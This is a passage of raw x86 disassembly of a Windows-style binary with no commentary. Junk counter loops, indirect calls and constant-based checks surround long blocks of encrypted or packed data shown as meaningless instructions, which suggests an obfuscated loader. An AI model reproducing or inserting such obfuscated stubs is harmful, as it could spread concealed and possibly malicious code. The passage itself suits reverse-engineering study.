  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0xed56264e
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a07
  401a76:	pop    esi
  401a77:	pop    esi
  401a78:	mov    bh,0xd5
  401a7a:	int    0x32
  401a7c:	push   ebx
  401a7d:	push   edx
  401a7e:	add    DWORD PTR [edi-0x25],edi
  401a81:	mov    esi,DWORD PTR [edx]
  401a83:	aas    
  401a84:	retf   0x8ccd
  401a87:	bound  ebp,QWORD PTR [eax-0x64ab8b4a]
  401a8d:	ins    DWORD PTR es:[edi],dx
  401a8e:	mov    cl,0x23
  401a90:	sub    bh,BYTE PTR fs:[ebx+0x22]
  401a94:	sub    ch,ch
  401a96:	loopne 0x401ad6
  401a98:	mov    ah,BYTE PTR ds:0xdad73dfd
  401a9e:	(bad)  
  401a9f:	js     0x401b0e
  401aa1:	scas   eax,DWORD PTR es:[edi]
  401aa2:	adc    DWORD PTR [eax+ebx*4+0x7],0xffffff96
  401aa7:	adc    al,0x56
  401aa9:	adc    eax,0xe85ad5ab
  401aae:	in     eax,dx
  401aaf:	pop    ebx
  401ab0:	fcom   QWORD PTR [ecx-0x4bc63059]
  401ab6:	or     dh,0x9c
  401ab9:	test   DWORD PTR [esi+esi*1+0x61],edi
  401abd:	xor    DWORD PTR cs:[edx-0x6399985e],ebp
  401ac4:	add    edx,DWORD PTR [edx-0x54]
  401ac7:	inc    edx
  401ac8:	adc    eax,0xdf55f888
  401acd:	mov    esp,0xbdc23816
  401ad2:	fisttp WORD PTR [ecx-0x2d4787e5]
  401ad8:	pushf  
  401ad9:	mov    ebx,0x1c862465
  401ade:	div    BYTE PTR [eax+0x243641c7]
  401ae4:	add    bh,BYTE PTR [edx+0x6e0d9e7a]
  401aea:	sbb    dh,BYTE PTR [edi+0x33811a6c]
  401af0:	mov    dl,0xc1
  401af2:	xchg   ecx,eax
  401af3:	retf   
  401af4:	xor    esp,DWORD PTR [eax-0x6a61c8bc]
  401afa:	xchg   cl,cl
  401afc:	jmp    0xfec5:0xe0dd9f6d
  401b03:	loopne 0x401ac7
  401b05:	dec    esp
  401b06:	ja     0x401b7a
  401b08:	or     ebx,DWORD PTR [edi-0x1d37b5b9]
  401b0e:	mov    edi,0xf7e7f779
  401b13:	push   edi
  401b14:	hlt    
  401b15:	sub    esi,esi
  401b17:	retf   0xdf75
  401b1a:	sbb    ebp,DWORD PTR [ecx-0x6fd45caf]
  401b20:	inc    ecx
  401b21:	rol    DWORD PTR [edx+0x6a],0xd1
  401b25:	ret    
  401b26:	ins    DWORD PTR es:[edi],dx
  401b27:	xlat   BYTE PTR ds:[ebx]
  401b28:	pusha  
  401b29:	inc    eax
  401b2a:	fisub  DWORD PTR [edi-0x67d52b36]
  401b30:	stos   DWORD PTR es:[edi],eax
  401b31:	mov    BYTE PTR [esi+0x6522f83f],ch
  401b37:	pop    eax
  401b38:	mov    ebp,DWORD PTR [eax-0x2d9e01c9]
  401b3e:	(bad)  
  401b3f:	push   ebp
  401b40:	mov    esp,0xd1099a45
  401b45:	das    
  401b46:	dec    ebx
  401b47:	mov    edi,0x7a1015f2
  401b4c:	pop    edx
  401b4d:	arpl   WORD PTR [ebx+ebp*8+0x42],si
  401b51:	rcl    DWORD PTR [esi+0x78],cl
  401b54:	push   esi
  401b55:	inc    esi
  401b56:	or     ebp,DWORD PTR [ebp+0x3]
  401b59:	iret   
  401b5a:	in     al,dx
  401b5b:	mov    ch,0x69
  401b5d:	addr16 out 0x9f,eax
  401b60:	add    DWORD PTR [edx],eax
  401b62:	enter  0xf64b,0x17
  401b66:	pop    eax
  401b67:	mov    edx,0xe6a97b30
  401b6c:	jo     0x401bbb
  401b6e:	pop    ebx
  401b6f:	mov    ch,0x87
  401b71:	pop    edx
  401b72:	int    0x37
  401b74:	dec    edi
  401b75:	fcomp  QWORD PTR [edi-0x4c]
  401b78:	xor    bl,BYTE PTR [ebx]
  401b7a:	int    0x12
  401b7c:	cmp    bl,BYTE PTR [ebx+0x5f]
  401b7f:	xor    BYTE PTR [ecx+0xd],bh
  401b82:	and    ecx,DWORD PTR [eax+ecx*2]
  401b85:	pop    eax
  401b86:	cli    
  401b87:	inc    ebp
  401b88:	ins    DWORD PTR es:[edi],dx
  401b89:	mov    ds:0x6a34df9b,al
  401b8e:	mov    ds:0x19940bd6,eax
  401b93:	jmp    0x15a6:0x9f33281a
  401b9a:	add    eax,0x9892edf7
  401b9f:	in     al,0x3c
  401ba1:	(bad)  
  401ba3:	xor    edx,DWORD PTR [ebx]
  401ba5:	mov    ds,ebp
  401ba7:	inc    ebx
  401ba8:	(bad)  
  401ba9:	xchg   esp,eax
  401baa:	pop    ds
  401bab:	cmc    
  401bac:	mov    bh,0xc7
  401bae:	xlat   BYTE PTR ds:[ebx]
  401baf:	push   edi
  401bb0:	int    0x3b
  401bb2:	jo     0x401bfa
  401bb4:	or     BYTE PTR [ecx+0x19],bh
  401bb7:	mov    ds:0x4b3446ff,eax
  401bbc:	mov    esi,0x4249f48b
  401bc1:	or     al,0xbb
  401bc3:	pop    edx
  401bc4:	mov    gs,ecx
  401bc6:	mov    ebx,0x9221c6b2
  401bcb:	ss mov eax,0xc9d41c24
  401bd1:	add    BYTE PTR [ebp-0x2ffb796a],ah
  401bd7:	ret    0x820c
  401bda:	jle    0x401bb1
  401bdc:	stos   BYTE PTR es:[edi],al
  401bdd:	addr16 jge 0x401b66
  401be0:	cld    
  401be1:	cmc    
  401be2:	and    al,BYTE PTR [ecx]
  401be4:	dec    ecx
  401be5:	pop    esi
  401be6:	nop
  401be7:	in     al,dx
  401be8:	cmp    al,0x59
  401bea:	pop    edx
  401beb:	call   0xa76ede34
  401bf0:	jp     0x401c21
  401bf2:	aam    0xf1
  401bf4:	dec    esi
  401bf5:	retf   
  401bf6:	mov    edx,0x39a8089c
  401bfb:	inc    ebx
  401bfc:	outs   dx,BYTE PTR ds:[esi]
  401bfd:	jl     0x401bb7
  401bff:	in     al,dx
  401c00:	popa   
  401c01:	sahf   
  401c02:	sub    eax,0x9ddac472
  401c07:	dec    esi
  401c08:	stos   DWORD PTR es:[edi],eax
  401c09:	mov    al,0x23
  401c0b:	adc    ax,0xb89
  401c0f:	pusha  
  401c10:	sbb    al,0xe2
  401c12:	jmp    0x6877:0x323b0c63
  401c19:	and    bl,BYTE PTR [ebp-0x760bba73]
  401c1f:	inc    ebp
  401c20:	lock mov eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	loope  0x401cbb
  401c92:	jae    0x401c89
  401c94:	xor    BYTE PTR [esi],al
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c38
  401c9d:	cmp    esi,esp
  401c9f:	push   ds
  401ca0:	xchg   ecx,eax
  401ca1:	call   0xb9d22e64
  401ca6:	mov    ah,0xc
  401ca8:	xlat   BYTE PTR ds:[ebx]
  401ca9:	mov    al,ds:0xffbc6fe9
  401cae:	aaa    
  401caf:	cs or  al,0x3
  401cb2:	push   ecx
  401cb3:	xor    ecx,DWORD PTR [esp+eax*8+0x533bddcd]
  401cba:	mov    cs,WORD PTR [eax]
  401cbc:	or     eax,0xeaea6bd2
  401cc1:	(bad)  
  401cc2:	jno    0x401c63
  401cc4:	mov    ch,0xfd
  401cc6:	jp     0x401c5a
  401cc8:	sbb    BYTE PTR [ecx+0x23],dl
  401ccb:	ds out 0xa4,eax
  401cce:	in     eax,0x69
  401cd0:	xor    BYTE PTR [edx-0x398ec911],al
  401cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd7:	test   al,0xa7
  401cd9:	and    al,BYTE PTR [eax+0x69]
  401cdc:	data16 rol BYTE PTR [ecx-0x3c],1
  401ce0:	outs   dx,BYTE PTR ds:[esi]
  401ce1:	push   di
  401ce3:	or     dh,BYTE PTR [edi+edi*1+0x5]
  401ce7:	lahf   
  401ce8:	out    0x7a,eax
  401cea:	push   ecx
  401ceb:	pop    esi
  401cec:	xor    ebx,DWORD PTR [edx+edi*4+0x23]
  401cf0:	ds adc bh,bl
  401cf3:	mov    al,ds:0x518a413e
  401cf8:	mov    esp,0x232f995b
  401cfd:	adc    DWORD PTR [ebp-0x47f6ed62],esp
  401d03:	nop
  401d04:	xor    BYTE PTR [ebp+0x1b],0x20
  401d08:	add    BYTE PTR [ebx-0x594ac15d],ch
  401d0e:	scas   eax,DWORD PTR es:[edi]
  401d0f:	jl     0x401d7f
  401d11:	sub    ah,dl
  401d13:	mov    dh,0xec
  401d15:	jnp    0x401cf1
  401d17:	jno    0x401d91
  401d19:	adc    eax,0x33dc78a5
  401d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1f:	ja     0x401cb2
  401d21:	stos   BYTE PTR es:[edi],al
  401d22:	aad    0xc0
  401d24:	ds pop edx
  401d26:	xchg   edx,eax
  401d27:	dec    ebx
  401d28:	into   
  401d29:	pop    ebx
  401d2a:	cmp    eax,0x728bb76
  401d2f:	pop    es
  401d30:	loopne 0x401ce7
  401d32:	mov    esi,0x611bc81
  401d37:	js     0x401d0e
  401d39:	xchg   ecx,eax
  401d3a:	xchg   esi,eax
  401d3b:	push   edx
  401d3c:	imul   eax,DWORD PTR [eax+0x61],0x1aa3bb56
  401d43:	mov    ds:0xb8ba4851,eax
  401d48:	ret    0xdf27
  401d4b:	inc    esi
  401d4c:	pop    ebx
  401d4d:	cmp    BYTE PTR [esi],al
  401d4f:	mov    eax,ds:0x35235d28
  401d54:	and    DWORD PTR [esi+0x5f605bc6],0x6dbfc90
  401d5e:	or     edi,DWORD PTR [ebx-0xafa4376]
  401d64:	push   esp
  401d65:	jo     0x401d10
  401d67:	in     al,dx
  401d68:	mov    ebx,0xdcdb2881
  401d6d:	add    DWORD PTR [esi+0x17],ebx
  401d70:	retf   0xb5a4
  401d73:	cwde   
  401d74:	jns    0x401d6a
  401d76:	cwde   
  401d77:	xchg   ecx,eax
  401d78:	in     eax,0x94
  401d7a:	loop   0x401df8
  401d7c:	lods   eax,DWORD PTR ds:[esi]
  401d7d:	push   es
  401d7e:	test   ax,0xf228
  401d82:	cmp    al,0x5d
  401d84:	push   ebp
  401d85:	jmp    0x401d80
  401d87:	inc    esi
  401d88:	dec    ecx
  401d89:	push   ecx
  401d8a:	icebp  
  401d8b:	adc    BYTE PTR [esp+esi*8],0x42
  401d8f:	inc    esi
  401d90:	je     0x401d4c
  401d92:	push   ebp
  401d93:	and    BYTE PTR [ecx+0x281ddd78],bh
  401d99:	inc    edi
  401d9a:	ss out 0xf4,al
  401d9d:	fsub   QWORD PTR [edi]
  401d9f:	pop    edx
  401da0:	bound  edx,QWORD PTR [edx]
  401da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401da3:	mov    bh,0xb8
  401da5:	sub    al,bh
  401da7:	pop    es
  401da8:	mov    al,0x7e
  401daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dab:	repnz sbb eax,0x1d807da9
  401db1:	mov    al,ds:0x25da7bbc
  401db6:	fs adc al,0xfb
  401db9:	out    0xbc,eax
  401dbb:	adc    dl,BYTE PTR [ebx-0x20]
  401dbe:	das    
  401dbf:	pop    ebx
  401dc0:	in     al,dx
  401dc1:	mov    cl,0x79
  401dc3:	das    
  401dc4:	lock cs ss jmp 0x4aa8:0x91ef903d
  401dce:	adc    DWORD PTR [eax-0x33],eax
  401dd1:	aam    0x92
  401dd3:	test   al,0xc
  401dd6:	inc    esi
  401dd7:	xor    al,0x6c
  401dd9:	icebp  
  401dda:	arpl   bp,sp
  401ddc:	inc    ebp
  401ddd:	popa   
  401dde:	out    dx,eax
  401ddf:	push   cs
  401de0:	fcom   DWORD PTR [ebx]
  401de2:	daa    
  401de3:	push   ebp
  401de4:	xor    DWORD PTR [ecx-0x6b],esi
  401de7:	sbb    eax,0x7449d542
  401dec:	mov    bl,0x0
  401dee:	bound  ebp,QWORD PTR [ebp+0x6f25b340]
  401df4:	push   eax
  401df5:	int3   
  401df6:	adc    eax,DWORD PTR [ebp-0x15107207]
  401dfc:	pop    edx
  401dfd:	shr    BYTE PTR [edi],cl
  401dff:	push   ebp
  401e00:	ss push ss
  401e02:	cmp    BYTE PTR [edx],dl
  401e04:	sub    DWORD PTR [edi+0x34],ebp
  401e07:	test   BYTE PTR [esi+0x16],cl
  401e0a:	xchg   ebp,eax
  401e0b:	cmp    BYTE PTR [edi-0x33d1c0fc],bh
  401e11:	pop    ebp
  401e12:	xchg   edi,eax
  401e13:	fst    DWORD PTR [ebx+0x52]
  401e16:	or     DWORD PTR [edx+0xd],ebp
  401e19:	jno    0x401df9
  401e1b:	retf   
  401e1c:	xor    al,0xa2
  401e1e:	dec    esp
  401e1f:	stos   BYTE PTR es:[edi],al
  401e20:	pop    ss
  401e21:	adc    ch,BYTE PTR [edi-0xa]
  401e24:	or     DWORD PTR [edi-0x4516c427],0xffffffac
  401e2b:	xchg   ebx,eax
  401e2c:	xchg   edi,eax
  401e2d:	es cdq 
  401e2f:	pushf  
  401e30:	icebp  
  401e31:	dec    esi
  401e32:	data16 outs dx,BYTE PTR ds:[esi]
  401e34:	mov    bh,0xb8
  401e36:	cmp    al,0x8f
  401e38:	outs   dx,BYTE PTR ds:[esi]
  401e39:	popa   
  401e3a:	ret    
  401e3b:	xchg   ecx,eax
  401e3c:	sahf   
  401e3d:	pop    ds
  401e3e:	jmp    0x818e820e
  401e43:	xor    BYTE PTR [edi-0x16d9af06],cl
  401e49:	push   edi
  401e4a:	add    al,BYTE PTR [eax]
  401e4c:	add    BYTE PTR [esi-0x75],ah
  401e4f:	inc    ebp
  401e50:	cld    
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	(bad)  
  401e81:	sub    BYTE PTR [eax+0x7e075adb],ch
  401e87:	jle    0x401e21
  401e89:	jg     0x401f09
  401e8b:	jle    0x401efb
  401e8d:	mov    WORD PTR [edx+ecx*1],?
  401e90:	jmp    0x9f99:0x3f26d550
  401e97:	mov    ebx,0x922649fd
  401e9c:	(bad)  
  401e9d:	push   ebx
  401e9e:	out    0xd4,eax
  401ea0:	les    ebx,FWORD PTR [eax]
  401ea2:	test   BYTE PTR [eax+0x3e],bl
  401ea5:	inc    ecx
  401ea6:	mov    edx,0x4cb8d681
  401eab:	call   0x7c72d55
  401eb0:	adc    BYTE PTR [ebx+eiz*4],0x3e
  401eb4:	imul   ebx,DWORD PTR [edi+0x73926338],0x6be67d87
  401ebe:	ficomp WORD PTR [edx-0x41925020]
  401ec4:	adc    DWORD PTR [edi],0xc4f191b0
  401eca:	in     eax,0x69
  401ecc:	dec    edx
  401ecd:	jo     0x401f34
  401ecf:	adc    DWORD PTR [edx+ecx*8],0x79c3665a
  401ed6:	mov    dl,0xcf
  401ed8:	ja     0x401f09
  401eda:	xor    al,0xd2
  401edc:	add    bl,cl
  401ede:	jmp    0xb75e:0x9f1fd164
  401ee5:	stc    
  401ee6:	test   eax,0x59f2d228
  401eeb:	xchg   DWORD PTR [esi+ecx*8+0x41],eax
  401eef:	xchg   ebx,eax
  401ef0:	pop    edx
  401ef1:	stos   DWORD PTR es:[edi],eax
  401ef2:	loop   0x401eae
  401ef4:	cmp    dh,BYTE PTR [esi+0x11ba7d6c]
  401efa:	mov    cx,WORD PTR ds:0xca623dfe
  401f01:	mov    dl,0xb5
  401f03:	(bad)  
  401f04:	mov    ebx,0x56ea4c14
  401f09:	(bad)  
  401f0a:	fld    DWORD PTR [ecx]
  401f0c:	pop    esi
  401f0d:	arpl   WORD PTR [eax-0x4156c6c],cx
  401f13:	sbb    ebp,DWORD PTR [ebp-0x7096ee55]
  401f19:	mov    DWORD PTR [esi+0x3733b15d],esi
  401f1f:	sbb    ah,ah
  401f21:	jns    0x401f5d
  401f23:	push   cs
  401f24:	push   ebx
  401f25:	add    ebp,DWORD PTR [eax+0x45]
  401f28:	lods   eax,DWORD PTR ds:[esi]
  401f29:	les    edi,FWORD PTR [edx]
  401f2b:	in     al,0x2a
  401f2d:	popf   
  401f2e:	sbb    al,0x95
  401f30:	and    BYTE PTR [eax],al
  401f32:	pop    ebx
  401f33:	dec    edi
  401f34:	int3   
  401f35:	or     al,0x1e
  401f37:	add    eax,0x7c85ca19
  401f3c:	ins    BYTE PTR es:[edi],dx
  401f3d:	xor    BYTE PTR [ecx],dl
  401f3f:	ficomp WORD PTR [eax+0x27965ad4]
  401f45:	add    al,0x39
  401f47:	aas    
  401f48:	and    al,BYTE PTR [esp+edi*1+0x8de69f0]
  401f4f:	int    0x71
  401f51:	sbb    DWORD PTR [ebx+0x7f71d63d],edx
  401f57:	mov    edx,0x6cadb413
  401f5c:	leave  
  401f5d:	repnz mov esi,0xb60d5df6
  401f63:	add    al,dh
  401f65:	int3   
  401f66:	daa    
  401f67:	xchg   DWORD PTR ds:0x91b49135,ebx
  401f6d:	add    BYTE PTR [ecx],dh
  401f6f:	or     BYTE PTR [esi],al
  401f71:	pusha  
  401f72:	mov    dl,dl
  401f74:	outs   dx,DWORD PTR ds:[esi]
  401f75:	aas    
  401f76:	inc    eax
  401f77:	push   edi
  401f78:	imul   edx,DWORD PTR [edx],0x662217e6
  401f7e:	pop    ebx
  401f7f:	fnsave [edx-0x76524fe6]
  401f85:	pop    edi
  401f86:	and    esi,DWORD PTR [ebp-0x65]
  401f89:	iret   
  401f8a:	iret   
  401f8b:	lea    ecx,[edi-0x40]
  401f8e:	and    BYTE PTR [esi],0xe9
  401f91:	sahf   
  401f92:	cwde   
  401f93:	push   es
  401f94:	dec    ebp
  401f95:	cmp    cl,0xb0
  401f98:	adc    DWORD PTR [edi+eiz*8+0x4e9974d4],0x373836cf
  401fa3:	ror    DWORD PTR [eax],0x16
  401fa6:	sbb    edx,eax
  401fa8:	lods   al,BYTE PTR ds:[esi]
  401fa9:	test   al,0x45
  401fab:	and    al,0x5a
  401fad:	int3   
  401fae:	cdq    
  401faf:	mov    ds:0x9a5aaf45,al
  401fb4:	inc    eax
  401fb5:	pop    esi
  401fb6:	fcmovnb st,st(0)
  401fb8:	loope  0x401f7e
  401fba:	dec    bx
  401fbc:	inc    ebx
  401fbd:	mov    bl,0xc2
  401fbf:	xor    al,0x70
  401fc1:	clc    
  401fc2:	sub    ecx,DWORD PTR [edi-0x7d]
  401fc5:	fwait
  401fc6:	stc    
  401fc7:	std    
  401fc8:	fcomp  DWORD PTR [ebx-0x12936633]
  401fce:	xor    bl,BYTE PTR [bp+si]
  401fd1:	std    
  401fd2:	(bad)  
  401fd4:	iret   
  401fd5:	js     0x401fd3
  401fd7:	dec    edi
  401fd8:	xor    eax,0x4d546c63
  401fdd:	shl    dl,cl
  401fdf:	add    eax,0x41ff49f2
  401fe4:	xor    ecx,DWORD PTR [edx]
  401fe6:	push   esi
  401fe7:	jno    0x401ff0
  401fe9:	aaa    
  401fea:	pop    ecx
  401feb:	shr    bh,cl
  401fed:	sbb    cl,al
  401fef:	or     BYTE PTR [edi+0x30],0xc3
  401ff3:	cmp    al,0x2f
  401ff5:	push   esp
  401ff6:	mov    ebx,DWORD PTR [esi+0xb]
  401ff9:	mov    BYTE PTR [esi-0x61],cl
  401ffc:	aas    
  401ffd:	cli    
  401ffe:	or     al,0xb6
  402000:	jl     0x402002
  402002:	mov    ah,0x5e
  402004:	cs mov ?,esp
  402007:	dec    ebx
  402008:	mov    al,ds:0x9cebdb66
  40200d:	popa   
  40200e:	repz jecxz 0x402070
  402011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402012:	jg     0x402045
  402014:	test   al,0xf0
  402016:	ficom  DWORD PTR [edx+0x15]
  402019:	pushf  
  40201a:	cmp    eax,0x4c0d065c
  40201f:	daa    
  402020:	adc    eax,0xa8fd8a2b
  402025:	mov    ds:0xa2d8ae4d,al
  40202a:	pop    ebx
  40202b:	pop    ebx
  40202d:	dec    ecx
  40202e:	outs   dx,DWORD PTR ds:[esi]
  40202f:	sti    
  402030:	cdq    
  402031:	mov    ds:0x4589c603,eax
  402036:	ror    BYTE PTR [ebx-0x749933bb],1
  40203c:	push   ebp
  40203d:	enter  0x3cbb,0x8a
  402041:	add    BYTE PTR [eax],al
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	ins    BYTE PTR es:[edi],dx
  4020e5:	push   edi
  4020e6:	sbb    al,0xe1
  4020e8:	test   BYTE PTR ds:0x7f557e7e,al
  4020ee:	jle    0x40216e
  4020f0:	(bad)  
  4020f1:	daa    
  4020f2:	pop    edx
  4020f3:	outs   dx,BYTE PTR ds:[esi]
  4020f4:	cld    
  4020f5:	imul   BYTE PTR [eax]
  4020f7:	nop
  4020f8:	aad    0x53
  4020fa:	fidivr WORD PTR [edi-0x2ed6c10b]
  402100:	into   
  402101:	pop    ebx
  402102:	cwde   
  402103:	test   DWORD PTR [eax+ecx*1],0x12fffd15
  40210a:	cs scas eax,DWORD PTR es:[edi]
  40210c:	add    al,0xc9
  40210e:	sub    esp,DWORD PTR [edi-0x34]
  402111:	imul   esi,DWORD PTR [esi-0x67],0x29
  402115:	xor    bl,ah
  402117:	cmp    bh,bl
  402119:	mov    dl,0xab
  40211b:	adc    ecx,DWORD PTR [edx]
  40211d:	clc    
  40211e:	lds    edi,FWORD PTR [ebp-0x6b670c30]
  402124:	int3   
  402125:	sub    al,0x97
  402127:	jmp    0x4020ff
  402129:	adc    al,0x19
  40212b:	dec    edi
  40212c:	enter  0x8172,0xa6
  402130:	fidiv  DWORD PTR [ecx]
  402132:	sub    cl,BYTE PTR [edx+0x24]
  402135:	rcr    dl,1
  402137:	cmp    eax,0xd5a3fdd
  40213c:	ds add ebx,eax
  40213f:	dec    eax
  402140:	fisub  DWORD PTR [esi]
